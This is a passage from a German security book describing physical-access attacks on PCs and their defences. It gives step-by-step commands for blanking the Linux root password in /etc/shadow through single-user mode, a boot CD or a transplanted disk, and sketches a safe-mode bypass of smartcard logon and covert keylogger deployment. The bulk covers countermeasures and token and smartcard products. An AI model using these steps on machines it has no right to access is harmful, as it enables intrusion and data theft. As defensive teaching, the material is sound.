root:$1$XuMcwWub$0PaACYJBF8ThKLcjyvLxC.:13412:0:99999:7:::\nZur L\u00f6schung des Root-Kennworts l\u00e4dt der Angreifer die Datei mit einem Editor (z. B. vi), l\u00f6scht die Zeichenfolge zwischen den Doppelpunkten beim Eintrag root und speichert im Anschluss die Datei. Das einzugebende Kommando lautet somit: (danach Entfernung der beschriebenen Zeichenfolge, die Bet\u00e4tigung der Tasten (ESC) :wq! und (Return))\nvi shadow\n146\nKapitel 12 \u2013 Szenario I: Datenklau vor Ort\nBild 12.16: Gel\u00f6schtes Kennwort beim Benutzer root\nBeim n\u00e4chsten Systemstart kann sich der Angreifer ohne Eingabe eines Kennworts am Root-Konto anmelden (die Eingabe des Usernamens root mit Bet\u00e4tigung der Taste (Return) reicht aus f\u00fcr das Login).\n12.2.2 Starten von einem Linux-Boot-Medium Ist es einem Angreifer unm\u00f6glich, den Rechner im Single-User-Runlevel zu starten (z. B. weil vom Bootloader ein Kennwort eingefordert wird), ist das Booten mit einem externen Medium wie CD-ROM oder USB-Stick \u2013 im Prinzip genau wie beim Knacken von Windows-Rechnern \u2013 ein wirkungsvoller Weg zur Eroberung. Die durchzuf\u00fchrenden Schritte werden am Start einer Knoppix-CD-ROM verdeutlicht. Im Vorfeld muss die Bootreihenfolge des Laufwerks im BIOS ge\u00e4ndert werden, sofern dieses bedenkliche \u00bbFeature\u00ab nicht bereits voreingestellt ist. Zur erfolgreichen Umsetzung ben\u00f6tigt der Angreifer Zugriff auf die Partition mit dem Verzeichnis /etc \u2013 im Speziellen auf die Datei /etc/shadow. Hierf\u00fcr ist das Partitionsprogramm \u00bbfdisk\u00ab das Mittel zum Zweck, mit dem die Partitionstabelle der Festplatte betrachtet und wertvolle Hinweise gewonnen werden k\u00f6nnen. Zur Not h\u00e4ngt der Angreifer s\u00e4mtliche Partitionen der Festplatte ein, bis er das Verzeichnis entdeckt hat. Folgende Schritte sind erforderlich: 1. Start des Rechners mit der Knoppix-CDROM (z. B. im Single-User-Mode) 2. fdisk \u2013l /dev/hda (sofern die einzuh\u00e4ngende Festplatte als Primary Master am EIDE/ATA-Anschluss h\u00e4ngt) zur Sichtung der Partitionen. In unserem Beispiel befindet sich das Verzeichnis /etc der Festplatte auf Partition /dev/hda2 3. mkdir /recover (Erstellung des Verzeichnisses /recover) 4. mount /dev/hda2 /recover (Mounten der Partition /dev/hda2 in den Mountpoint /recover) 5. cd /recover/etc (Wechsel in das Verzeichnis /recover/etc) 6. vi shadow\n(Aufruf des Editors vi zur Bearbeitung der Datei shadow)\n7. L\u00f6schung der Zeichenfolge zwischen den Doppelpunkten beim Eintrag root (wie beschrieben im Kapitel Starten von Linux im Single-User-Mode, vgl. Abb. 12.16) 8. Speicherung der Datei durch Bet\u00e4tigung der Tasten (ESC), :wq! und (Return) wie beschrieben im Kapitel \u00bbStarten von Linux im Single-User-Mode\u00ab 9. Reboot des Rechners, z. B. mit shutdown \u2013r now und Entfernung des Mediums.\n12.2 Zugriff auf Linux-Rechner\n147\nBeim n\u00e4chsten Systemstart kann sich der Angreifer ohne Eingabe eines Kennworts beim Root-Konto anmelden (die Eingabe des Usernamens root mit Bet\u00e4tigung der Taste (Return) reicht aus f\u00fcr das Login).\n12.2.3 Einbinden der zu kompromittierenden Festplatte in ein Fremdsystem Hat ein Angreifer genug Zeit und die notwendigen Werkzeuge in greifbarer N\u00e4he, stellt der Anschluss der erbeuteten Festplatte an ein von ihm kontrolliertes Fremdsystem einen h\u00f6chst effektiven Weg dar, sich fremder Daten zu bem\u00e4chtigen. Der Angreifer kann in diesem Fall nicht nur Kennw\u00f6rter zur\u00fccksetzen, sondern auch gleich die gesamten Daten absaugen. Zur \u00c4nderung des Root-Kennworts sind folgende Schritte notwendig: 1. Einbau der Festplatte in das Fremdsystem, z. B. als Secondary Master 2. fdisk \u2013l /dev/hdc (sofern die einzuh\u00e4ngende Festplatte als Primary Slave am EIDE/ATA-Anschluss h\u00e4ngt) zur Sichtung der Partitionen. In unserem Beispiel befindet sich das Verzeichnis /etc der Festplatte auf Partition /dev/hdc2 3. mkdir /recover (Erstellung des Verzeichnisses /recover) 4. mount /dev/hdc2 /recover (Mounten der Partition /dev/hdc2 in den Mountpoint /recover) 5. cd /recover/etc (Wechsel in das Verzeichnis /recover/etc) 6. vi shadow\n(Aufruf des Editors vi zur Bearbeitung der Datei shadow)\n7. L\u00f6schen der Zeichenfolge zwischen den Doppelpunkten beim Eintrag root (wie beschrieben im Abschnitt \u00bbStarten von Linux im Single-User-Mode\u00ab, vgl. Abb. 12.12) 8. Speichern der Datei durch Bet\u00e4tigung der Tasten (ESC), :wq! und (Return) wie beschrieben im Kapitel \u00bbStarten von Linux im Single-User-Mode\u00ab. 9. Shutdown des Rechners, z. B. mit shutdown \u2013h now, Re-Migration der Festplatte in den urspr\u00fcnglichen Rechner und Start des Systems. Beim Systemstart kann sich der Angreifer ohne Eingabe eines Kennworts beim RootKonto anmelden (die Eingabe des Usernamens root mit Bet\u00e4tigung der Taste (Return) reicht aus f\u00fcr das Login). Die Freude dar\u00fcber w\u00e4hrt f\u00fcr gew\u00f6hnlich jedoch nicht lange: Irgendwann wird der Eigent\u00fcmer des Systems den Einbruch entdecken und die Maschine aus dem Verkehr ziehen (die Vergabe eines neuen Kennworts f\u00fcr den Benutzer root l\u00e4sst selbst den merkbefreitesten Administrator aufhorchen). Die Eroberung des Systems auf diesem Wege ist einfach zu offensichtlich. Sehr viel ansprechender ist es, die von dem Eigent\u00fcmer selbst verwendeten Kennw\u00f6rter zu brechen, um sich fortan mit offiziellen Nutzerkennungen am System g\u00fctlich zu tun. Positiver Nebeneffekt: Viele Menschen neigen zur Wiederverwendung von Kennw\u00f6rtern. Ein so errechnetes Kennwort er\u00f6ffnet dem Angreifer m\u00f6glicherweise Zugriff auf weitere Rechner \u2013 ein von IT-Betreuern oft-\n148\nKapitel 12 \u2013 Szenario I: Datenklau vor Ort\nmals untersch\u00e4tzter Vorteil des Angreifers. Das Errechnen von Passw\u00f6rtern (PasswordCracking) behandeln wir zu einem sp\u00e4teren Zeitpunkt.\n12.3\nAbwehrma\u00dfnahmen gegen einen physischen Angriff von au\u00dfen\nDa wir dieses Angriffszenario nicht aus Selbstzweck geschildert haben, m\u00f6chten wir Ihnen nat\u00fcrlich nicht verschweigen, dass es durchaus auch geeignete Ma\u00dfnahmen gibt, die potenziellen Angreifern das Leben erschweren k\u00f6nnen.\nBild 12.17: Blockgrafik Angriffsszenario\n1. Die t\u00fcckischste und effektivste Angriffsvariante besteht im Einsatz eines Hardwarebasierten Keyloggers, was das Kapern eines Rechners ungemein erleichtert und den Einsatz von Passwortcrackern etc. entbehrlich macht. Da kaum jemand seinen Rechner geschweige denn sein Keyboard t\u00e4glich inspiziert, muss man hier gr\u00f6\u00dferen technischen Aufwand betreiben, um dieses Risiko auszuschlie\u00dfen. Da Softwareschutzma\u00dfnahmen wie z. B. der Einsatz einer virtuellen Tastatur34 erst nach dem Hochfahren des Betriebssystems greifen, muss der Zugriff des Hardware-Keyloggers also schon im Vorfeld abgewehrt werden. In Betracht kommen hier Verschl\u00fcsselungssysteme mit Pre-Boot Authentication in Kombination mit einem entsprechenden USB-Token. Diese Zwei-Faktoren-Authentifizierung garantiert maximale Sicherheit, da der Zugangscode aus zwei voneinander unabh\u00e4ngigen Bestandteilen generiert wird: dem im USB-Token gespeicherten Schl\u00fcssel (den man besitzt) und einer Benutzer-PIN (die man wei\u00df). Da der Keylogger nur die PIN abgreifen kann, zum Entsperren der 34\nzu erreichen unter Windows: Start / Ausf\u00fchren / osk.exe\n12.3 Abwehrma\u00dfnahmen gegen einen physischen Angriff von au\u00dfen\n149\nHardware aber zwei Codes notwendig sind, bleibt der Angreifer au\u00dfen vor \u2013 selbst wenn der die Festplatte ausbauen oder den PC \u00fcber eine CD booten w\u00fcrde. Die Kosten f\u00fcr eine derartige Absicherung setzen sich zusammen aus Lizenzkosten (z. B. Einzellizenz f\u00fcr DrivecryptPlus35 125 \u20ac) zzgl. Kosten f\u00fcr die damit einhergehende Hardware (z. B. ca. 45 \u20ac f\u00fcr den USB-Token). 2. Das CMOS-Anmeldepasswort sollte auf jeden Fall gesetzt werden; neuere BIOS-Versionen verf\u00fcgen h\u00e4ufig nicht mehr \u00fcber Masterkeys. 3. Der Rechner sollte gegen unbefugtes \u00d6ffnen des Geh\u00e4uses gesch\u00fctzt werden, z. B. durch ein kleines, aber solides Vorh\u00e4ngeschloss. Ein Datendieb m\u00fcsste dann mit Bolzenschneider etc. anr\u00fccken, was die Wahrscheinlichkeit eines Datenklaus deutlich verringert (Gelegenheit macht Diebe). Oftmals befinden sich auch Sensoren im Inneren moderner PCs, die eine \u00d6ffnung des Geh\u00e4uses registrieren und beim n\u00e4chsten Bootvorgang darauf hinweisen. Da diese L\u00f6sungen jedoch nicht immer zufriedenstellend arbeiten, bieten sie sich allenfalls als flankierende Ma\u00dfnahme an. 4. Gegen das Hochfahren eines Rechners mit einem externen Bootmedium (USB-Stick, CD-ROM etc.) oder dem Zugriff \u00fcber einen extern verbundenen Firewire-Rechner k\u00f6nnen folgende Ma\u00dfnahmen getroffen werden: Deaktivieren von Autoplay und ungenutzten Schnittstellen, Pre-Boot-Encryption, Deaktivieren des Standby-Modus; Herunterfahren des PCs, wenn er l\u00e4ngere Zeit unbeaufsichtigt bleibt. Zus\u00e4tzlich k\u00f6nnen die relevanten Zugangsports mit einer Softwarel\u00f6sung gesperrt beziehungsweise kontrolliert werden. 5. Das R\u00fccksetzen des Administratorpassworts l\u00e4sst sich nur verhindern, wenn der externe Zugriff auf das Betriebssystem unterbunden ist (vgl. oben). Im \u00dcbrigen kommt es h\u00e4ufiger vor, dass bei der Erstinstallation von Windows gar kein Passwort vergeben wurde. Ein Datendieb k\u00f6nnte sich dreist als Administrator anmelden und h\u00e4tte freien Zugriff auf Programme und Daten. Hier empfiehlt es sich auf jeden Fall, f\u00fcr das Administratorkonto ein Passwort zu vergeben, z. B. im laufenden Betrieb durch: Start / Ausf\u00fchren / net user administrator . Au\u00dferdem sollte sichergestellt werden, dass nur ein Administratorkonto eingerichtet ist. Wird das Passwort zur\u00fcckgesetzt, f\u00e4llt es dann n\u00e4mlich sofort auf. 6. Gegen Passwortknacker wirken organisatorische und technische Ma\u00dfnahmen. Vor allen Dingen sollte der unsichere LanManager-Hash in der Registry unter HKLM\\ SYSTEM\\CurrentControlSet\\Control\\LSA deaktiviert werden: Erstellen Sie dort einen DWORD-Wert mit dem Namen NoLMHash und setzen Sie ihn auf 1. Ansonsten gilt f\u00fcr die Passwortvergabe: \u2022 mindestens acht, besser zehn Zeichen lang, \u2022 Verwendung von Gro\u00df- und Kleinbuchstaben, \u2022 mit Zahlen, \u2022 mit Sonderzeichen, \u2022 kein Begriff aus dem W\u00f6rterbuch und keine Namen.\n35\nwww.securstar.com\n150\n12.4\nKapitel 12 \u2013 Szenario I: Datenklau vor Ort\nZwei-Faktoren-Authentifizierung\nNach einer internen Diskussion haben wir uns entschlossen, das oben genannte Verfahren unter pragmatischen Aspekten etwas st\u00e4rker herauszustellen. Viele auch weiter unten beschriebene Angriffstechniken haben das Aussp\u00e4hen vertraulicher Daten, insbesondere Anmeldekennw\u00f6rter und Login-Daten zum Ziel. Obwohl es leistungsf\u00e4hige Software gibt, dies zu verhindern, ist eine Softwarel\u00f6sung in den allermeisten F\u00e4llen unsicherer als eine Technik, die auf eine Kombination von Hardware und Software setzt. Wir stellen hier drei kosteng\u00fcnstige, in wichtigen Details allerdings voneinander abweichende L\u00f6sungen vor, die nicht zuletzt auch f\u00fcr Privatanwender interessant sein d\u00fcrften.\n12.4.1 iKey 2032 von SafeNet36 Der iKey ist ein USB-Token, ein kompaktes Zwei-Faktoren-Authentifizierungstoken, das manipulationssicher ist und die Generierung und Speicherung von Schl\u00fcsseln sowie die Verschl\u00fcsselungsfunktionalit\u00e4t und den Support f\u00fcr digitale Signaturen \u00fcbernimmt. Es kann eingesetzt werden zur Sicherung des Benutzer-Logins, der E-Mail-Verschl\u00fcsselung, der Festplattenverschl\u00fcsselung, der VPN-Authentifizierung und anderer gesch\u00fctzter Clientapplikationen.\nBild 12.18: USB-Token\nWie eine Smartcard enth\u00e4lt der iKey einen Chip, auf dem sich maximal 32 KB Daten speichern lassen, u. a. Zertifikate, pers\u00f6nliche Schl\u00fcssel, Login-Daten und Lizenzen. Auch wenn man als Privatanwender damit keine komplexe Sicherheitsl\u00f6sung wie Entrust37 betreiben will, ist das Token, das man ab etwa 30 \u20ac z. B. bei eBay erwerben kann, dennoch f\u00fcr zwei Hauptzwecke gut nutzbar: die gesch\u00fctzte Windows-Anmeldung und die Festplatten-/Containerverschl\u00fcsselung, z. B. mit Drivecrypt. Der Login in das Token wird mit einer Passphrase gesichert. Erst danach kann man seine Schl\u00fcssel und Zertifikate importieren. Als Privat-User kann man die f\u00fcr die weitere Arbeit notwendigen Zertifikate kostenlos bei einer Institution wie CAcert.org38\n36\nwww.safenet-inc.com/Products/Data_Protection/Multi-Factor_Authentication/Certificatebased_PKI_USB_Authenticators.aspx\n37\nwww.entrust.com\n38\nwww.cacert.org\n12.4 Zwei-Faktoren-Authentifizierung\n151\noder https://cert.startcom.org/ downloaden; nat\u00fcrlich kann man auch ein Zertifikat bei einem E-Mail-Provider wie web.de beantragen. Die genauen Schritte sind ausf\u00fchrlich im iKey-User\u2019s Guide beschrieben.\nBild 12.19: iKey-Schaltzentrale\nAu\u00dfer mit den Windows-Versionen 2000/2003/2008, XP und Vista sowie Mac OS arbeitet iKey auch mit einer Reihe von Drittanbietern zusammen, z. B. mit Securstar, dem Anbieter von Festplattenverschl\u00fcsselungstools wie DriveCrypt und DriveCryptPlus.\n152\nKapitel 12 \u2013 Szenario I: Datenklau vor Ort\nBild 12.20: Der DriveCrypt-Schl\u00fcssel wird im iKey gespeichert\nDas Procedere ist bei allen Applikationen \u00e4hnlich. Immer dann, wenn ein Login oder eine Authentifizierung gefordert ist, muss der Anwender das Token plus die dazu passende PIN bereithalten. An dieser H\u00fcrde scheitern alle Keylogger, da sie h\u00f6chstens die PIN protokollieren k\u00f6nnen, die ohne zugeh\u00f6rigen Token aber v\u00f6llig wertlos ist. Wird die 2-FaktorenAuthentifizierung mit einer Verschl\u00fcsselung der Bootplatte kombiniert, spricht man von einer 2-Faktoren-Pre-Boot-Authentication. Alle darauf gespeicherten Daten sind sowohl vor Passwortangriffen mit Passwortcrackern und Keyloggern als auch vor dem direkten Aussp\u00e4hen durch externen Zugriff via Boot-CD, Image-Cloning etc. gesch\u00fctzt. Eine Alternative zum USB-Token sind Smartcard-Reader, wie sie im e-Banking (HBCI) eingesetzt werden.\n12.4 Zwei-Faktoren-Authentifizierung\n153\nBild 12.21: Festplattenverschl\u00fcsselung mit Token und PIN\n12.4.2 Chipdrive Smartcard Office Wer den Umgang mit Zertikaten, Zertifikatspeichern, Private Keys und Public Keys scheut und eine deutschsprachige Oberfl\u00e4che bevorzugt, findet mit dem Chipdrive-Produkt39 sicher eine angemessene L\u00f6sung. Aus Sicht des Privatanwenders besteht der einzige gravierende Nachteil gegen\u00fcber dem USB-Token in der erforderlichen Anschaffung eines Kartenlesers. Dieser wird von unterschiedlichen Firmen angeboten (Sicherheitsklasse 2 ab 50 \u20ac), und wer die Anschaffung erw\u00e4gt, wird den Reader auch f\u00fcrs eBanking sehr praktisch finden \u2013 zumal er von den meisten Experten als die einzig wirklich sichere L\u00f6sung f\u00fcr diesen Zweck angesehen wird.\nBild 12.22: Chipdrive Masterkey\n39\nwww.chipdrive.de\n154\nKapitel 12 \u2013 Szenario I: Datenklau vor Ort\nSelbst wenn Sie auf die Anschaffung des Masterkeys f\u00fcr ca. 15 bis 18 \u20ac verzichten, k\u00f6nnen Sie dennoch mit anderen, bereits vorhandenen Chipkarten arbeiten. Der Funktionsumfang von Smartcard Office ist beeindruckend: \u2022\nWinLogon f\u00fcr die sichere An- und Abmeldung an Microsoft Windows.\n\u2022\nPassword Manager, der alle z. B. f\u00fcr Online-Shops ben\u00f6tigten Passw\u00f6rter sicher auf der Chipkarte speichert.\n\u2022\nDisk Encryption f\u00fcr die Container-Verschl\u00fcsselung.\n\u2022\nSmartcard Manager f\u00fcr die zentrale Chipkartenverwaltung, inklusive Backup.\n\u2022\nSmartcard Tools, ein nettes Add-On f\u00fcr die Nutzung bestehenden Chipkarten (SIM Manager Pro, Geldkarten- und Krankenkarten-Viewer, Smartcard Editor).\n\u2022\nNotepad zur Speicherung der wichtigsten Zugangsdaten und Seriennummern.\n\u2022\nForm Fill f\u00fcr das sichere Ausf\u00fcllen von Internetformulardaten.\nDie Installation gestaltet sich supereinfach; lediglich beim WinLogon muss festgelegt werden, wie das System reagieren soll.\nBild 12.23: Konfiguration WinLogon\nAm sichersten ist es, die Windows-Anmeldung komplett auf die Smartcard umzustellen40. In diesem Fall wird das normale Administratorkennwort ersetzt und die Anmeldung \u00fcbernimmt das Chipdrive Winlogon-Modul. Eine gewisse Vorsicht ist allerdings angeraten. Wird die PIN (die das Admin-Kennwort ersetzt) dreimal falsch eingegeben, sperrt das System und es gibt dann nur noch sehr eingeschr\u00e4nkt Zugriffsm\u00f6glichkeiten auf Windows. Da Windows auf die Smartcard sozusagen eingeschworen wurde, macht es auch keinen gro\u00dfen Sinn, das Administratorkennwort mit einer CD zur\u00fcckzusetzen.\n40\nIn der Voreinstellung kann der User sich konventionell oder \u00fcber die Smartcard anmelden.\n12.4 Zwei-Faktoren-Authentifizierung\n155\nBild 12.24: Das CHIPDRIVE-Kontrollzentrum\nF\u00fcr Privatanwender ist der gebotene Rundumschutz einfach zu managen, preiswert und sicher, da die wichtigsten Daten dem Zugriff von Keyloggern entzogen sind. Allerdings \u2013 und das ist ein kleiner Nachteil, den das Smartcard Office mit vielen anderen vergleichbaren Produkten teilt \u2013 fehlt die M\u00f6glichkeit, die Bootpartition zu verschl\u00fcsseln. Damit kann man sich durchaus arrangieren, wenn man seine privaten Daten in einer vom Programm angebotenen Containerdatei (die wie ein separates Laufwerk angesprochen werden kann) versteckt. Der Verschl\u00fcsselungsalgorithmus (AES, DES, Triple DES) wie die angebotene Verschl\u00fcsselungsst\u00e4rke (bis 256 Bit) sind nach heutigem Kenntnisstand ausreichend. Eine Sicherheitsl\u00fccke in diesem Konzept gibt es aber trotzdem: Im abgesicherten Modus kann ein Angreifer sich als Administrator einloggen und mit Start / Ausf\u00fchren / msconfig die Starteinstellungen manipulieren, d. h., er deaktiviert die Smartcard-Treiber und die zugeh\u00f6rigen Startprogramme. Danach kann er sich beim Neustart v\u00f6llig ungest\u00f6rt an einem zuvor gesetzten Admin-Konto anmelden und das System manipulieren. Um die Spuren seines Eindringens zu verwischen, w\u00fcrde er im letzten Schritt die zuvor aktivierten Treiber und Startprogramme wieder deaktivieren, um den Ursprungszustand wieder herzustellen. Das ist allerdings nur halb so schlimm, wie es sich anh\u00f6rt. Denn der grunds\u00e4tzliche Schutz, die Absicherung wichtiger Schl\u00fcssel und Logindaten via Smartcard, wird dadurch nicht beeintr\u00e4chtigt. Selbst wenn im Hintergrund ein frisch installiertes Remote Administration Tool l\u00e4uft, w\u00e4ren diese Daten weiterhin gesch\u00fctzt.\n156\nKapitel 12 \u2013 Szenario I: Datenklau vor Ort\n12.4.3 Security Suite Die Security Suite41 (vormals Authention) von Digitronic ist ebenfalls ein deutschsprachiges Produkt, das Wechseldatentr\u00e4ger sowie alle PKCS#11-f\u00e4higen Ger\u00e4te und ausgew\u00e4hlte Smartcards, Keys, Magnetkarten und ber\u00fchrungslose Systeme unterst\u00fctzt. Die Security Suite gibt es in der Home Edition mit folgenden Features: \u2022\nNutzung von bis zu 16 verschl\u00fcsselten Laufwerken gleichzeitig, wobei jedes Laufwerk bis zu 1 TB (Terabyte) gro\u00df sein kann\n\u2022\nVerschl\u00fcsselung der Daten mittels fortschrittlicher und standardisierter Verschl\u00fcsselungsalgorithmen wie AES, Blowfish oder Triple-DES\n\u2022\nM\u00f6glichkeit der automatischen Verbindung von verschl\u00fcsselten Laufwerken, bei der die Passw\u00f6rter sicher auf USB-Sticks, Smartcards oder anderen Hardwareschl\u00fcsseln abgespeichert werden\n\u2022\nSichere Anmeldung am Betriebssystem mittels Hardwareschl\u00fcssel und spezifischer PIN\n\u2022\nNach einmaliger Authentifizierung \u2013 Anmeldung bei s\u00e4mtlichen Anwendungen wie Online-Banking, eBay, E-Mail-Postfach, ohne erneute Eingabe der Zugangsdaten\n\u2022\nEinfache und komfortable Aufzeichnung von Zugangsdaten \u00fcber einen Hotkey\n\u2022\nSichere und verschl\u00fcsselte Ablage der Zugangsdaten auf USB-Sticks, Smartcards oder anderen Hardwareschl\u00fcsseln\nF\u00fcr professionelle Anwender stehen zus\u00e4tzliche Netzwerkmodule bereit, unter anderem \u2022\nCrypted Group Share, mit dem Benutzergruppen vertrauliche Daten auf Netzlaufwerken sicher speichern k\u00f6nnen\n\u2022\nUniversal Device Block verhindert die Benutzung unerw\u00fcnschter USB-Ger\u00e4te\n\u2022\nExtended Device Block managt das Blockieren weiterer Ger\u00e4tegruppen am PC\n\u2022\nToken Management System f\u00fcr die Verwaltung des Tokens und seiner Daten\nMit dieser Zweiteilung hat Digitronic auf die Anwenderkritik reagiert, dass das Tool f\u00fcr Privatanwender \u00fcberdimensioniert sei. Dank einer zur Verf\u00fcgung gestellten Testlizenz kann der Anwender in Ruhe testen, wie er mit den Sicherheitsfeatures in der Praxis klarkommt. Nach der Installation kann der Anwender sich anhand einer kompilierten Videohilfedatei \u00fcber die einzelnen Schritte seiner Wunschkonfiguration informieren. Gut gel\u00f6st ist auch die Einbindung \u00e4lterer Token (wie unseres iKey): Auf der Downloadseite von Digitronic kann sich der Anwender die f\u00fcr die Anbindung ben\u00f6tigten Treiber direkt herunterladen.\n41\nwww.digitronic.net/security_suite.html\n12.4 Zwei-Faktoren-Authentifizierung\nBild 12.25: \u00dcberschaubare Installationsroutine\nBild 12.26: Die Security Suite arbeitet mit den g\u00e4ngigsten Tokens & Security Cards zusammen\n157\n158\nKapitel 12 \u2013 Szenario I: Datenklau vor Ort\nDie Inbetriebnahme von Security Suite gestaltet sich dann nach der Installation und Konfiguration des Tokens relativ einfach. Beim Starten von Windows muss der Anwender sich mit der zum ausgew\u00e4hlten Token passenden PIN anmelden.\nBild 12.27: Anmeldeprozedur der Logon-Komponente\nDer sicherheitsbewusste Anwender wird allerdings die Alternativanmeldung via (Strg)(Alt)+(Entf) ausschlie\u00dfen und nur das Procedere \u00fcber den Token zulassen. Was uns beim Test allerdings auffiel war, dass etliche Sekunden verstrichen, bis der Token erkannt wurde, subjektiv hatten wir den Eindruck, dass die Anmeldung \u00fcber Smartcard Office um etliches schneller war. Auf der anderen Seite bietet Security Suite ein Sicherheitsfeature, mit dem Smartcard Office nicht aufwarten kann: Auf Wunsch blockiert das Programm den Windows-Start im abgesicherten Modus, wodurch ein Angreifer erst einmal daran gehindert wird, sich \u00fcber den Umweg als Administrator ins System einzuhacken. Es gibt aber auch einen Wermutstropfen, \u00fcber den auch versiertere User stolpern k\u00f6nnen. Wir wollten testen, wie wirkungsvoll die USB-Ports blockiert werden, und haben im Nachhinein diese Option aktiviert. In der Folge waren dann scheinbar via Default tats\u00e4chlich alle USB-Ports blockiert, neben der externen Soundcard auch Scanner, Security-Card-Reader, USB-Hubs (inkl. Maus) und nat\u00fcrlich auch unser USBToken.\n159\n13 Szenario II: Der PC ist verwanzt Ausgangsszenario: Angriffsziel ist wieder Ihr B\u00fcrorechner bzw. Ihr PC zu Hause; nur geht es dieses Mal nicht um den einmaligen Abgriff der Daten, sondern um eine zeitlich befristete Abh\u00f6rattacke. Der Angreifer kommt aus Ihrem pers\u00f6nlichen oder beruflichen Umfeld. Ziel der \u00dcberwachung sind alle Aktivit\u00e4ten, die Sie am PC abwickeln: E-Mails, e-Banking, Internet, Zeichnungen, Grafiken, Bilder und vieles mehr. Bekanntlich ern\u00e4hren sich Wanzen in freier Wildbahn durch Saugen von Pflanzens\u00e4ften oder (seltener) von Blut. Im \u00fcbertragenen Sinn nennt man auch elektroakustische Abh\u00f6rger\u00e4te Wanzen. PC-Wanzen wiederum, wozu insbesondere die Software-Keylogger geh\u00f6ren, sind \u00dcberwachungsprogramme (Surveillance Tools), mit denen sich so gut wie alle Anwenderaktivit\u00e4ten \u00fcberwachen lassen. Grunds\u00e4tzlich macht es Sinn, hier zwischen spezifischen und unspezifischen Attacken zu unterscheiden \u2013 auch im Hinblick auf die Abwehrm\u00f6glichkeiten. Eine unspezifische Attacke erfolgt f\u00fcr gew\u00f6hnlich \u00fcber eine pr\u00e4parierte Webseite oder einen infizierten Mailanhang. In beiden F\u00e4llen wird neben anderer Malware auch ein Keylogger installiert, mit dem u. a. alle Texteingaben des Users protokolliert und an eine unbekannte Adresse via Mail oder FTP weiterverschickt werden. Der Angreifer ist in aller Regel nicht an der Person X interessiert, diese ger\u00e4t eher zuf\u00e4llig in sein Visier. Ob er jetzt die Login- oder Kontodaten von X oder Y ausspioniert, ist nicht kriegsentscheidend, es z\u00e4hlt hier vor allem das Resultat: finanziell verwertbare Informationen abzuziehen und missbr\u00e4uchlich einzusetzen. Anders bei der spezifischen Attacke, wo z. B. Sie als Person im Visier auftauchen. Der Angreifer hat es nicht auf irgendwelche verwertbaren Daten, sondern genau auf Ihre pers\u00f6nlichen Daten abgesehen. Gr\u00fcnde daf\u00fcr gibt es viele, sei es die misstrauische Ehefrau, die fortgesetzte Untreue vermutet, seien es die Eltern, die ihren Z\u00f6gling gern der missbr\u00e4uchlichen Internetnutzung \u00fcberf\u00fchren m\u00f6chten. Abgesehen von staatlichen Institutionen, die berufsbedingt gern lauschen und abh\u00f6ren, k\u00f6nnen hinter diesen Attacken auch mehr oder minder legitime Interessen von Arbeitgebern stehen, die finanzielle Untreue, Verrat von Firmengeheimnissen beweisen bzw. abstellen m\u00f6chten. Last but not least nutzen viele Industriespione Softwarewanzen bzw. Keylogger, um relevante Forschungsergebnisse und -dokumente \u00fcber einen l\u00e4ngeren Zeitraum hinweg auszuspionieren. Nach einer Studie von iDefense (nach 2005 leider nicht weitergef\u00fchrt) erlebten zwischen 2000 und 2005 Keylogger einen wahren H\u00f6henflug.\n160\nKapitel 13 \u2013 Szenario II: Der PC ist verwanzt\nBild 13.1: Grafik iDefense: Hochkonjunktur f\u00fcr Keylogger\nIm Gegensatz zu ihren Kollegen von der Hardwarefraktion bieten Software-Keylogger mehr Funktionalit\u00e4t und mehr Bedienungskomfort (aus Sicht des Angreifers). In fast allen F\u00e4llen, wo eine bestimmte Person im Fokus des Angreifers steht, wird man sich nicht auf Hackertools verlassen, sondern zu einem kommerziellen Produkt greifen (oder staatlicherseits auf eine Eigenentwicklung setzen, wie zum Beispiel der Bund im Rahmen der Online-Durchsuchung42 auf den Bundestrojaner). Kommerzielle Produkte bieten nicht nur mehr Sicherheit, sondern auch mehr Supportleistungen f\u00fcr die Anwender. Der gr\u00f6\u00dfte Vorteil besteht indes darin, dass nach unseren Tests viele kommerzielle Surveillance Tools von g\u00e4ngigen Virenscannern nicht aufgesp\u00fcrt bzw. nicht als Malware identifiziert werden, vermutlich um Schadenersatzklagen abzuwenden. Das Risiko, dass das Opfer durch einen verd\u00e4chtigen Eintrag in einem Scanprotokoll mehr zuf\u00e4llig \u00fcber den Keylogger stolpert, kann dadurch merklich verringert werden. Um kommerzielle Keylogger einzusetzen, braucht sich der Angreifer auch nicht mehr unbedingt vor Ort die Finger schmutzig zu machen: Produkte wie der Ardamax Keylogger43 verf\u00fcgen \u00fcber alternative Installationsroutinen, wo der vorkonfigurierte Keylogger dem Opfer auch via E-Mail zugeschickt werden kann. Vor allem aber ist Keylogging ein Gesch\u00e4ft, wie der folgende Fall aus Israel zeigt:\nBild 13.2: Quelle: Computerwoche 17/2006\n42\nhttp://de.wikipedia.org/wiki/Online-Durchsuchung\n43\nwww.ardamax.com\n13.1 Software-Keylogger\n13.1\n161\nSoftware-Keylogger\n13.1.1 Ausforschen von Sicherheitseinstellungen Gerade beim Thema Sicherheitseinstellungen f\u00e4llt stark ins Gewicht, ob der PC im Firmen- oder im Heimnetzwerk h\u00e4ngt. Die Motivation und Eigeniniative des Anwenders ist meistens im privaten Umfeld st\u00e4rker ausgepr\u00e4gt, d. h., der User kann sich auf keine Institution wie die IT-Abteilung und auf keine grundgesicherte Netzinfrastruktur verlassen, sondern wird sich nach Ma\u00dfgabe seiner F\u00e4higkeiten und Kenntnisse selbst absichern, z. B. durch Installation von Malware-Scannern und einer Desktop-Firewall. Im Firmennetz haben Vor-Ort-Angreifer deshalb die besseren Karten, da auf den Firmenclients meist nur rudiment\u00e4re Securitytools wie Virenscanner laufen und man sich im \u00dcbrigen mehr auf serverseitige Sicherheitseinrichtungen verl\u00e4sst. Sofern der in Szenario 1 geschilderte \u00bbDatenklau vor Ort\u00ab erfolgreich war, wei\u00df der Angreifer ziemlich genau Bescheid \u00fcber die auf dem Rechner eingesetzten Sicherheitstools. Dies ist allerdings nur die halbe Miete. Was fehlt, sind Kenntnisse \u00fcber das Sicherheitsbewusstsein und Verhalten des Users. Hier lauten die entscheidenden Fragen: Werden regelm\u00e4\u00dfig Security-Updates und die aktuellsten Anti-Virensignaturen aufgespielt? Wenn eine Desktop-Firewall auf dem Rechner ihren Dienst verrichtet, welche Sicherheitsfeatures sind aktiviert? Wie geht der Anwender mit Sicherheitswarnungen um, die bestimmte Tools generieren? Sind Tools auf dem Rechner, mit denen sich RootkitAktivit\u00e4ten nachweisen lassen, und kann der Anwender ad\u00e4quat damit umgehen? An diesem Punkt w\u00e4ren dann Social-Engineering-F\u00e4higkeiten seitens des Angreifers gefragt. Wird die PC-Wanze vor Ort 